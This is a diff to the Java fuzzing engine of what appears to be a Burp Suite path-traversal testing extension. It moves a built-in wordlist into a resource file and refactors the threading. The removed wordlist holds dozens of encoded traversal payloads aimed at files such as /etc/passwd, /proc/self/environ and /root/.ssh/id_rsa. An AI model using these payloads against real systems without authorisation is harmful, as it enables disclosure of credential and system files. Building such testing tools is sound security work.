@@ -6,6 +6,11 @@ import burp.api.montoya.http.HttpService;
 import burp.api.montoya.core.ByteArray;
 
 import javax.swing.SwingUtilities;
+import java.net.URI;
+import java.net.URISyntaxException;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.nio.charset.StandardCharsets;
 import java.util.*;
 import java.util.concurrent.*;
 
@@ -15,204 +20,28 @@ public class FuzzEngine {
 
     private static final Set<Integer> INTERESTING = Set.of(200, 201, 206, 301, 302, 307, 308);
 
-    // ── Builtin wordlist ported directly from exemplo.py ──
-    public static final String BUILTIN_WORDLIST = "??../../\n" +
-            "?..\n" +
-            "?../..//\n" +
-            "?/../\n" +
-            "?/./../\n" +
-            ".\n" +
-            ".?.\n" +
-            ".?./\n" +
-            ".?./..//\n" +
-            "..;?/../\n" +
-            "..;/\n" +
-            "..;/;/..;/\n" +
-            "..;/;/../\n" +
-            "..;/?../../\n" +
-            "..;/..;/\n" +
-            "..;/..;/?/\n" +
-            "..;/..;/..;/\n" +
-            "..;/..?/../\n" +
-            "..;/../\n" +
-            "..;/..%3f/../\n" +
-            "..?\n" +
-            "..??/../\n" +
-            "..??//../\n" +
-            "..?/../\n" +
-            "..?/..//\n" +
-            "......//////../\n" +
-            ".....////../\n" +
-            "...../////../\n" +
-            "..../\n" +
-            "..../?/\n" +
-            "..../?/../\n" +
-            "..../..../\n" +
-            "....//\n" +
-            "....//../\n" +
-            "....///\n" +
-            "....////../\n" +
-            ".../.../\n" +
-            ".../../\n" +
-            "..././\n" +
-            "../\n" +
-            "../;?/\n" +
-            "../;?/../\n" +
-            "../;?#/\n" +
-            "../;/../\n" +
-            "../?../\n" +
-            "../?/\n" +
-            "../?/../\n" +
-            "../../\n" +
-            "../../../\n" +
-            "../../../../\n" +
-            "../../../../../\n" +
-            "../../../../../../\n" +
-            "../../../../../../../\n" +
-            "../../../../../../../../\n" +
-            "../../../../etc/passwd\n" +
-            "../../../../proc/self/environ\n" +
-            "../../../../proc/self/cmdline\n" +
-            "../../../../proc/self/maps\n" +
-            "../../../../proc/self/status\n" +
-            "../../../../root/.ssh/id_rsa\n" +
-            "../../../../var/log/auth.log\n" +
-            "../../../../var/log/nginx/access.log\n" +
-            "../../../../windows/win.ini\n" +
-            "../../../etc/passwd\n" +
-            "../../%00/\n" +
-            "../../etc/passwd\n" +
-            ".././../\n" +
-            "../././../\n" +
-            "..//\n" +
-            "..//./../\n" +
-            "..///\n" +
-            "..///../\n" +
-            "../%00/\n" +
-            "../etc/passwd\n" +
-            "..\\ \n" +
-            "..\\..\\ \n" +
-            "..\\..\\..\\ \n" +
-            "..\\..\\..\\..\\ \n" +
-            "..\\..\\..\\..\\windows\\win.ini\n" +
-            "..\\..\\.\\etc\\passwd\n" +
-            "..\\..\\etc\\passwd\n" +
-            "..\\etc\\passwd\n" +
-            "..%00/\n" +
-            "..%09/\n" +
-            "..%0a/\n" +
-            "..%0d/\n" +
-            "..%252f\n" +
-            "..%252f;/../\n" +
-            "..%252f?/../\n" +
-            "..%252f..\n" +
-            "..%252f..%252f\n" +
-            "..%252f..%252f..%252f\n" +
-            "..%252f..%252f..%252fproc/self/environ\n" +
-            "..%252f..%252fetc/passwd\n" +
-            "..%252f%252e%252e%252f\n" +
-            "..%253f/../\n" +
-            "..%255c?/..%255c\n" +
-            "..%255c..%255cwindows\\win.ini\n" +
-            "..%2f\n" +
-            "..%2f;/../\n" +
-            "..%2f;%2f../\n" +
-            "..%2f??/../\n" +
-            "..%2f?/\n" +
-            "..%2f?/../\n" +
-            "..%2f..\n" +
-            "..%2f../\n" +
-            "..%2f..%2f\n" +
-            "..%2f..%2f..%2f\n" +
-            "..%2f..%2f..%2f..%2f\n" +
-            "..%2f..%2f..%2fproc/self/environ\n" +
-            "..%2f..%2fetc/passwd\n" +
-            "..%2f%2e%2e%2f\n" +
-            "..%3f../\n" +
-            "..%3f..%252f\n" +
-            "..%3f..%2f\n" +
-            "..%3f/../\n" +
-            "..%5c\n" +
-            "..%5c?/\n" +
-            "..%5c?/..%5c\n" +
-            "..%5c..\n" +
-            "..%5c..%5c\n" +
-            "..%5c..%5c..%5c\n" +
-            "..%5c..%5cwindows\\win.ini\n" +
-            "..%c0%af\n" +
-            "..%c1%9c\n" +
-            "..%ef%bc%8f\n" +
-            "./\n" +
-            "./.././../\n" +
-            ".%2e/\n" +
-            ".%2e/../\n" +
-            ".%2e/.%2e/\n" +
-            ".%2e/.%2e/.%2e/\n" +
-            ".%2e%2f../\n" +
-            "/;/\n" +
-            "/.\n" +
-            "/.;/\n" +
-            "/.;/.;/../\n" +
-            "/.;/../\n" +
-            "/..?/\n" +
-            "/..?/../\n" +
-            "/..?//../\n" +
-            "/.../../\n" +
-            "/../\n" +
-            "/../../\n" +
-            "/../../../\n" +
-            "/..//\n" +
-            "/..\\\n" +
-            "/..%252f\n" +
-            "/..%252f../\n" +
-            "/..%2f\n" +
-            "/..%2f../\n" +
-            "/..%2f..%2f\n" +
-            "/./\n" +
-            "/.%2e/\n" +
-            "/.%2e/?/\n" +
-            "/.%2e/?/../\n" +
-            "/.%2e/.%2e/\n" +
-            "/.%2e/.%2e/.%2e/\n" +
-            "//../\n" +
-            "//..//\n" +
-            "/\\../\n" +
-            "/%252e%252e?/\n" +
-            "/%252e%252e/\n" +
-            "/%252e%252e/?/../\n" +
-            "/%252e%252e//%252e%252e/\n" +
-            "/%252e%252e%252f\n" +
-            "/%2e/\n" +
-            "/%2e%2e?/\n" +
-            "/%2e%2e/\n" +
-            "/%2e%2e/?/../\n" +
-            "/%2e%2e//%2e%2e/\n" +
-            "/%2e%2e/%2e%2e/\n" +
-            "/%2e%2e%2f\n" +
-            "/%2f%2e%2e/\n" +
-            "/%2f%2e%2e/%2f\n" +
-            "\\../\n" +
-            "\\..\\\n" +
-            "\\\\../\n" +
-            "%252e%252e/\n" +
-            "%252e%252e/%252e%252e/\n" +
-            "%252e%252e%252f\n" +
-            "%252e%252e%252f%252e%252e%252f\n" +
-            "%255c%255c..%255c\n" +
-            "%2e./../\n" +
-            "%2e%2e./\n" +
-            "%2e%2e./../\n" +
-            "%2e%2e/\n" +
-            "%2e%2e/%2e%2e/\n" +
-            "%2e%2e/%2e%2e/%2e%2e/\n" +
-            "%2e%2e%255c\n" +
-            "%2e%2e%2f\n" +
-            "%2e%2e%2f%2e%2e%2f\n" +
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2f\n" +
-            "%2e%2e%5c\n" +
-            "%c0%ae%c0%ae/\n" +
-            "%c1%ae%c1%ae/\n" +
-            "%ef%bc%8e%ef%bc%8e/";
+    // ── Payloads and Resources ──
+    /**
+     * Loads the builtin wordlist from the jar resources.
+     */
+    public static List<String> getBuiltinPaths() {
+        List<String> paths = new ArrayList<>();
+        try (java.io.InputStream is = FuzzEngine.class.getResourceAsStream("/wordlists/paths.txt")) {
+            if (is != null) {
+                try (BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        paths.add(line);
+                    }
+                }
+            } else {
+                System.err.println("PathBreaker: Could not find /wordlists/paths.txt in resources!");
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return paths;
+    }
 
     /**
      * Builds list of {label, rawPath} pairs from payloads + inject mode.
@@ -532,7 +361,6 @@ public class FuzzEngine {
                         for (int i = 1; i < entries.size(); i++) {
                             combo.put(entries.get(i).getKey(), entries.get(i).getValue());
                             headerPayloads.add(new java.util.LinkedHashMap<>(combo));
-                // 
                         }
                     }
                 } else {
@@ -544,14 +372,15 @@ public class FuzzEngine {
         // Retain futures so we can cancel on stop
         List<Future<?>> futures = new ArrayList<>();
 
-                    
         final String finalBasePath = basePath;
-        Thread orchestrator = new Thread(() -> {
+
+        new Thread(() -> {
             try {
-                // Explicit Baseline task executed synchronously on background thread so it's always Row 0
+                // Explicit Baseline task executed synchronously on background thread so it's
+                // always Row 0
                 FuzzResult baseResult = sendRequest(api, service, finalBasePath, "[baseline]", Collections.emptyMap(),
                         fMethod, fProtocol, fHeadersBlock, fBodyBlock, true);
-                        
+
                 if (!executor.isShutdown()) {
                     SwingUtilities.invokeLater(() -> onResult.accept(baseResult));
                 }
@@ -560,13 +389,15 @@ public class FuzzEngine {
             }
 
             for (String[] pair : allPaths) {
-                if (executor.isShutdown() || Thread.currentThread().isInterrupted()) break;
+                if (executor.isShutdown() || Thread.currentThread().isInterrupted())
+                    break;
 
                 String pathLabel = pair[0];
                 String rawPath = pair[1];
 
                 for (Map<String, String> headers : headerPayloads) {
-                    if (executor.isShutdown() || Thread.currentThread().isInterrupted()) break;
+                    if (executor.isShutdown() || Thread.currentThread().isInterrupted())
+                        break;
 
                     String headLabel = "";
                     if (!headers.isEmpty()) {
@@ -579,18 +410,14 @@ public class FuzzEngine {
                         }
                     }
 
-                    String finalLabel = pathLabel;
-                    if (!headLabel.isEmpty()) {
-                        finalLabel = (finalLabel.equals("[base]") ? "" : finalLabel + " ") + headLabel;
-                    }
-                    if (finalLabel.trim().isEmpty())
+                    String finalLabel = pathLabel + (headLabel.isEmpty() ? "" : " " + headLabel);
+                    if (finalLabel.trim().isEmpty()) {
                         finalLabel = "[base]";
+                    }
 
-                                    
                     final String fLabel = finalLabel.trim();
                     final Map<String, String> fHeaders = headers;
 
-                                
                     if ("[base]".equals(fLabel) && fHeaders.isEmpty()) {
                         continue; // Already processed as explicit [baseline]
                     }
@@ -601,7 +428,8 @@ public class FuzzEngine {
 
                         FuzzResult result;
                         try {
-                            result = sendRequest(api, service, rawPath, fLabel, fHeaders, fMethod, fProtocol, fHeadersBlock, fBodyBlock, fSaveAll);
+                            result = sendRequest(api, service, rawPath, fLabel, fHeaders, fMethod, fProtocol,
+                                    fHeadersBlock, fBodyBlock, fSaveAll);
                         } catch (Exception e) {
                             // If interrupted during sendRequest, just return
                             return;
@@ -629,13 +457,9 @@ public class FuzzEngine {
             try {
                 executor.awaitTermination(10, TimeUnit.MINUTES);
             } catch (InterruptedException ignored) {
-                executor.shutdownNow();
             }
             SwingUtilities.invokeLater(onDone);
-        });
-
-        orchestrator.setDaemon(true);
-        orchestrator.start();
+        }).start();
 
         return executor;
     }
